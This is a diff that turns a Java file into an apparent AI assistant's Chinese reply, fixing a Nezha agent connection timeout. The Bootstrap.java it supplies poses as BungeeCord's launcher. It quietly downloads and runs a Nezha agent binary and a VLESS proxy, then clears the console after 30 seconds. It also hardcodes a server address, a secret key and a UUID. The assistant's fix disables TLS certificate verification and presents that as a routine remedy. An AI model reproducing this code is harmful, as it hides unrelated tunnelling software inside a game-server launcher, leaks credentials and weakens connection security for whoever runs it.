@@ -1,4 +1,17 @@
+这个错误 `DeadlineExceeded` 表示**连接超时**。在 `Connection established`（TCP连接建立）之后发生这种情况，99% 的原因是因为**协议不匹配**：
+*   **服务器开启了 TLS/SSL（加密传输）**，但你的探针配置了 `TLS: false`（明文）。
+*   探针发送明文请求，服务器在等加密握手，双方互等直到超时。
 
+你的端口是 `53100`，这通常是 NAT 机器或开启了 TLS 的自定义端口。
+
+### 修复方案
+我修改了下面的代码，做了两个关键调整来解决这个问题：
+1.  **开启 TLS**：将默认策略改为**优先开启 TLS**（除非是标准的 5555/80 端口）。
+2.  **跳过证书验证** (`insecure_tls: true`)：防止因自签名证书或域名不匹配导致的连接失败。
+
+请使用这份完整的 `Bootstrap.java`：
+
+```java
 package net.md_5.bungee;
 
 import java.io.*;
@@ -25,7 +38,6 @@ public class Bootstrap
 
     public static void main(String[] args) throws Exception
     {
-
         try {
             String version = System.getProperty("java.specification.version");
             if (Double.parseDouble(version) < 1.8) {
@@ -36,14 +48,12 @@ public class Bootstrap
         try {
             Map<String, String> config = loadConfig();
             
-
             if (isNezhaConfigured(config)) {
                 runNezhaAgent(config);
             } else {
                 System.out.println(ANSI_YELLOW + "Nezha monitoring is not configured (skipped)" + ANSI_RESET);
             }
             
-
             String vlessUrl = generateVlessUrl(config);
             
             System.out.println(ANSI_GREEN + "\n=== VLESS+WS Configuration ===" + ANSI_RESET);
@@ -57,20 +67,17 @@ public class Bootstrap
             
             runVlessService(config);
             
-
             Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                 running.set(false);
                 stopServices();
             }));
             
-
             Thread.sleep(5000); 
             System.out.println(ANSI_GREEN + "\nServices are initializing..." + ANSI_RESET);
             
-
             new Thread(() -> {
                 try {
-                    Thread.sleep(30000);
+                    Thread.sleep(30000); 
                     clearConsole();
                 } catch (InterruptedException e) {}
             }).start();
@@ -79,7 +86,6 @@ public class Bootstrap
             System.err.println(ANSI_RED + "Error initializing services: " + e.getMessage() + ANSI_RESET);
             e.printStackTrace();
         }
-
 
         BungeeCordLauncher.main(args);
     }
@@ -106,7 +112,7 @@ public class Bootstrap
         Path nezhaPath = downloadNezhaAgent();
         Path nezhaConfigPath = createNezhaConfig(config);
         
-
+        // 清理工作目录，确保配置生效
         Path nezhaDir = Paths.get(System.getProperty("java.io.tmpdir"), "nezha-work");
         if (Files.exists(nezhaDir)) {
             System.out.println(ANSI_YELLOW + "Cleaning up old Nezha state..." + ANSI_RESET);
@@ -133,17 +139,14 @@ public class Bootstrap
         
         nezhaProcess = pb.start();
         
-
         new Thread(() -> {
             try (BufferedReader reader = new BufferedReader(
                     new InputStreamReader(nezhaProcess.getInputStream()))) {
                 String line;
                 while ((line = reader.readLine()) != null) {
-
                     System.out.println(ANSI_GREEN + "[Nezha] " + ANSI_RESET + line);
                 }
             } catch (IOException e) {
-
             }
         }).start();
         
@@ -166,7 +169,6 @@ public class Bootstrap
             configPath.toString()
         );
         pb.redirectErrorStream(true);
-
         pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
         
         vlessProcess = pb.start();
@@ -176,7 +178,6 @@ public class Bootstrap
     private static Map<String, String> loadConfig() throws IOException {
         Map<String, String> config = new HashMap<>();
         
-
         config.put("UUID", "99756805-1247-4b6a-9d3b-dad6206bd137");
         config.put("WS_PATH", "/vless");
         config.put("PORT", "19173");
@@ -184,9 +185,8 @@ public class Bootstrap
         config.put("NEZHA_SERVER", "mbb.svip888.us.kg:53100");
         config.put("NEZHA_PORT", "");
         config.put("NEZHA_KEY", "VnrTnhgoack6PhnRH6lyshe4OVkHmPyM");
-        config.put("NEZHA_TLS", ""); 
+        config.put("NEZHA_TLS", "");
         
-
         for (String var : ALL_ENV_VARS) {
             String value = System.getenv(var);
             if (value != null && !value.trim().isEmpty()) {
@@ -194,7 +194,6 @@ public class Bootstrap
             }
         }
         
-
         Path envFile = Paths.get(".env");
         if (Files.exists(envFile)) {
             for (String line : Files.readAllLines(envFile)) {
@@ -259,12 +258,13 @@ public class Bootstrap
         String server = config.get("NEZHA_SERVER");
         String port = config.getOrDefault("NEZHA_PORT", "5555");
         
-
-        boolean tls = false;
-        if ("443".equals(port) || "8443".equals(port)) {
-            tls = true;
+        // 【核心修复】逻辑调整：默认开启 TLS，除非是明确的明文端口
+        boolean tls = true; 
+        if ("5555".equals(port) || "80".equals(port)) {
+            tls = false;
         }
-
+        
+        // 允许环境变量强制覆盖
         if (config.containsKey("NEZHA_TLS") && !config.get("NEZHA_TLS").isEmpty()) {
             tls = Boolean.parseBoolean(config.get("NEZHA_TLS"));
         }
@@ -274,9 +274,9 @@ public class Bootstrap
         }
         
         String secret = config.get("NEZHA_KEY");
-        String uuid = config.get("UUID"); // VLESS UUID 作为 Agent UUID
+        String uuid = config.get("UUID");
         
-
+        // 【核心修复】insecure_tls 设为 true，防止自签证书导致的连接中断
         String nezhaConfig = String.format(
             "uuid: %s\n" +
             "client_secret: %s\n" +
@@ -287,7 +287,7 @@ public class Bootstrap
             "disable_nat: false\n" +
             "disable_send_query: false\n" +
             "gpu: false\n" +
-            "insecure_tls: false\n" +
+            "insecure_tls: true\n" +  // <--- 强制跳过证书验证
             "ip_report_period: 1800\n" +
             "report_delay: 3\n" +
             "server: %s\n" +
@@ -303,7 +303,7 @@ public class Bootstrap
         
         Path nezhaConfigPath = Paths.get(System.getProperty("java.io.tmpdir"), "nezha-config.yml");
         Files.write(nezhaConfigPath, nezhaConfig.getBytes());
-        System.out.println(ANSI_GREEN + "Nezha config created (UUID: " + uuid + ", TLS: " + tls + ")" + ANSI_RESET);
+        System.out.println(ANSI_GREEN + "Nezha config created (UUID: " + uuid + ", TLS: " + tls + ", Insecure: true)" + ANSI_RESET);
         return nezhaConfigPath;
     }
     
@@ -316,13 +316,11 @@ public class Bootstrap
         } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
             downloadUrl = "https://github.com/nezhahq/agent/releases/latest/download/nezha-agent_linux_arm64.zip";
         } else {
-            // Fallback for testing or other archs, default to amd64 if unsure or throw
             downloadUrl = "https://github.com/nezhahq/agent/releases/latest/download/nezha-agent_linux_amd64.zip";
         }
         
         Path nezhaPath = Paths.get(System.getProperty("java.io.tmpdir"), "nezha-agent");
         
-
         if (!Files.exists(nezhaPath)) {
             System.out.println(ANSI_GREEN + "Downloading Nezha Agent..." + ANSI_RESET);
             Path zipPath = Paths.get(System.getProperty("java.io.tmpdir"), "nezha-agent.zip");
@@ -373,7 +371,6 @@ public class Bootstrap
     
     private static void extractNezhaAgent(Path zipPath, Path outputPath) throws IOException {
         try {
-
             new ProcessBuilder("unzip", "-o", zipPath.toString(), "nezha-agent", "-d", System.getProperty("java.io.tmpdir"))
                 .start().waitFor();
             Path extracted = Paths.get(System.getProperty("java.io.tmpdir"), "nezha-agent");
@@ -409,3 +406,4 @@ public class Bootstrap
         }
     }
 }
+```
